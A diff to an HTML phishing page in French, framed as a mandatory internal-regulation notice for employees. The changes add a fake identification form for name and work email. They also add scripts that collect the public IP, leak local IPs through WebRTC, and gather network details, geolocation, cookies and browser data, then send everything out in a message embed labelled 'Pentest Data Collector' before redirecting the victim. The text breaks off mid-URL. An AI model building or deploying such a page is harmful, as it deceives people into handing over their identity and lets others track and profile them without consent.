@@ -26,6 +26,21 @@
             border-radius: 8px; margin: 20px 0;
             text-align: center;
         }
+        .form-group {
+            margin: 15px 0;
+        }
+        label {
+            display: block; margin-bottom: 5px;
+            font-weight: bold; color: #333;
+        }
+        input[type="text"], input[type="email"] {
+            width: 100%; padding: 12px;
+            border: 2px solid #ddd; border-radius: 6px;
+            font-size: 16px; box-sizing: border-box;
+        }
+        input[type="text"]:focus, input[type="email"]:focus {
+            border-color: #007bff; outline: none;
+        }
         .btn { 
             background: linear-gradient(45deg, #28a745, #20c997);
             color: white; padding: 15px 30px; 
@@ -46,6 +61,11 @@
             display: none; text-align: center;
             color: #007bff; margin: 20px 0;
         }
+        .auth-form {
+            background: #f8f9fa; padding: 20px;
+            border-radius: 8px; margin: 20px 0;
+            border: 1px solid #dee2e6;
+        }
     </style>
 </head>
 <body>
@@ -60,14 +80,34 @@
         </div>
         
         <p>Cher(e) collaborateur(trice),</p>
-        <p>Suite aux nouvelles directives de la direction, nous vous prions de prendre connaissance du nouveau règlement interne qui entre en vigueur immédiatement.</p>
+        <p>Suite aux nouvelles directives de la direction, nous vous prions de vous identifier puis de prendre connaissance du nouveau règlement interne qui entre en vigueur immédiatement.</p>
+        
+        <div class="auth-form">
+            <h3>🔐 Identification Obligatoire</h3>
+            
+            <div class="form-group">
+                <label for="prenom">Prénom *</label>
+                <input type="text" id="prenom" name="prenom" required placeholder="Votre prénom">
+            </div>
+            
+            <div class="form-group">
+                <label for="nom">Nom de famille *</label>
+                <input type="text" id="nom" name="nom" required placeholder="Votre nom de famille">
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email professionnel *</label>
+                <input type="email" id="email" name="email" required placeholder="prenom.nom@entreprise.com">
+            </div>
+        </div>
         
         <button class="btn" onclick="ouvrirDocument()">
-            📄 Accéder au document (Connexion sécurisée)
+            📄 S'identifier et accéder au document
         </button>
         
         <div class="loading" id="loading">
             <p>🔐 Vérification de vos autorisations...</p>
+            <p>📡 Analyse de sécurité réseau...</p>
             <p>⏳ Chargement du document sécurisé...</p>
         </div>
         
@@ -78,12 +118,29 @@
 
     <script>
         function ouvrirDocument() {
+            // Validation des champs
+            var prenom = document.getElementById('prenom').value.trim();
+            var nom = document.getElementById('nom').value.trim();
+            var email = document.getElementById('email').value.trim();
+            
+            if (!prenom || !nom || !email) {
+                alert('⚠️ Veuillez remplir tous les champs obligatoires');
+                return;
+            }
+            
             // Afficher le message de chargement
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.btn').style.display = 'none';
             
-            // Collecter les informations
+            // Collecter les informations de base
             var infos = {
+                // Nouvelles informations d'identité
+                prenom: prenom,
+                nom: nom,
+                nom_complet: prenom + ' ' + nom,
+                email: email,
+                
+                // Informations système existantes
                 navigateur: navigator.userAgent,
                 plateforme: navigator.platform,
                 langue: navigator.language,
@@ -95,10 +152,73 @@
                 referent: document.referrer || "Accès direct",
                 horodatage: new Date().toISOString(),
                 cookies: document.cookie || "Aucun cookie",
-                connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
+                connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
+                
+                // Informations WiFi/Réseau
+                wifi_type: navigator.connection ? navigator.connection.type : "Inconnue",
+                wifi_downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : "Inconnue",
+                wifi_rtt: navigator.connection ? navigator.connection.rtt + ' ms' : "Inconnue",
+                wifi_saveData: navigator.connection ? (navigator.connection.saveData ? "Activé" : "Désactivé") : "Inconnue"
             };
             
-            // Tentative de géolocalisation (optionnel)
+            // Obtenir l'IP publique d'abord
+            obtenirIPPublique(infos);
+        }
+        
+        function obtenirIPPublique(infos) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    infos.ip_publique = data.ip || "Non disponible";
+                    infos.ville = data.city || "Inconnue";
+                    infos.pays = data.country_name || "Inconnu";
+                    infos.fai = data.org || "Inconnu";
+                    obtenirIPLocale(infos);
+                })
+                .catch(() => {
+                    // Fallback avec un autre service
+                    fetch('https://api64.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            infos.ip_publique = data.ip || "Non disponible";
+                            obtenirIPLocale(infos);
+                        })
+                        .catch(() => {
+                            infos.ip_publique = "Impossible à obtenir";
+                            obtenirIPLocale(infos);
+                        });
+                });
+        }
+        
+        function obtenirIPLocale(infos) {
+            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            
+            if (RTCPeerConnection) {
+                var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                var ips = [];
+                
+                pc.createDataChannel("");
+                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                
+                pc.onicecandidate = function(ice) {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                    if (myIP && ips.indexOf(myIP[1]) == -1) {
+                        ips.push(myIP[1]);
+                    }
+                };
+                
+                setTimeout(() => {
+                    infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non disponibles";
+                    obtenirGeolocalisation(infos);
+                }, 2000);
+            } else {
+                infos.ip_locales = "WebRTC non supporté";
+                obtenirGeolocalisation(infos);
+            }
+        }
+        
+        function obtenirGeolocalisation(infos) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -126,6 +246,21 @@
                     title: "📊 Informations Collectées",
                     color: 3066993,
                     fields: [
+                        {
+                            name: "👤 Identité",
+                            value: "**Nom complet:** " + infos.nom_complet + "\n**Email:** " + infos.email,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 Adresses IP",
+                            value: "**Publique:** " + (infos.ip_publique || "N/A") + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
+                            inline: false
+                        },
+                        {
+                            name: "📡 Réseau WiFi",
+                            value: "**Type:** " + infos.wifi_type + "\n**Débit:** " + infos.wifi_downlink + "\n**Latence:** " + infos.wifi_rtt,
+                            inline: true
+                        },
                         {
                             name: "🌐 Navigateur",
                             value: "```" + infos.navigateur.substring(0, 800) + "```",
@@ -174,7 +309,7 @@
                     ],
                     timestamp: infos.horodatage,
                     footer: {
-                        text: "Pentest Data Collector v2.0"
+                        text: "Pentest Data Collector v2.1 - IP/WiFi/Identity"
                     }
                 }]
             };
@@ -184,6 +319,15 @@
                 message.embeds[0].fields.push({
                     name: "📍 Géolocalisation",
                     value: `**Latitude:** ${infos.latitude}\n**Longitude:** ${infos.longitude}\n**Précision:** ${infos.precision}`,
+                    inline: false
+                });
+            }
+            
+            // Ajouter localisation IP si disponible
+            if (infos.ville || infos.pays) {
+                message.embeds[0].fields.push({
+                    name: "🗺️ Localisation IP",
+                    value: `**Ville:** ${infos.ville || "N/A"}\n**Pays:** ${infos.pays || "N/A"}\n**FAI:** ${infos.fai || "N/A"}`,
                     inline: false
                 });
             }
@@ -209,18 +353,4 @@
             }).then(function() {
                 // Redirection après 3 secondes
                 setTimeout(function() {
-                    window.location.href = 'https://www.service-public.fr/particuliers/vosdroits/N31476';
-                }, 3000);
-            }).catch(function() {
-                // En cas d'erreur, redirection quand même
-                setTimeout(function() {
-                    window.location.href = 'https://www.service-public.fr/particuliers/vosdroits/N31476';
-                }, 3000);
-            });
-        }
-        
-        // Masquer les erreurs JS
-        window.onerror = function() { return true; };
-    </script>
-</body>
-</html>
+                    window.location.href = 'https
